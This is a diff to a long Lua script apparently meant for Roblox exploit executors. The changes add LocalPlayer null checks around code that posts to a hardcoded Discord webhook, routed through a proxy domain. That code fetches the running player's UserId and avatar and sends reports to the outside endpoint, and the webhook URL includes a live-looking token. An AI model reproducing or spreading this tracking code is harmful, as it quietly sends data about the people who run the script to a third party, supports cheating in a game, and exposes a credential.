@@ -11568,6 +11568,10 @@ game.Players.LocalPlayer.Chatted:Connect(runChatCommand)
 
  
 
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
 local discord = "https://discord.com/api/webhooks/1520026886191972566/6gmbXgnzORM8lfaP_jz-kWCR9VlOuN3lmSOoXXQsHTsbUFhoPWZrfoCRnJz-vEYmNBhV"
 if discord and discord ~= "" then
     if discord:find("discord.com") then discord = discord:gsub("discord.com", "webhook.lewisakura.moe") end
@@ -11577,7 +11581,7 @@ end
 local r = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
 local pleasework = "https://www.roblox.com/images/PersonalChannel/missing_avatar.png"
-if r then
+if r and LocalPlayer then
     pcall(function()
         local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"
         local resp = r({Url = url, Method = "GET"})
@@ -11591,7 +11595,7 @@ if r then
 end
 
 local function sendWebhook(title, content, color)
-    if not r or not discord or discord == "" then return end
+    if not r or not discord or discord == "" or not LocalPlayer then return end
     
     local fields = {
         {
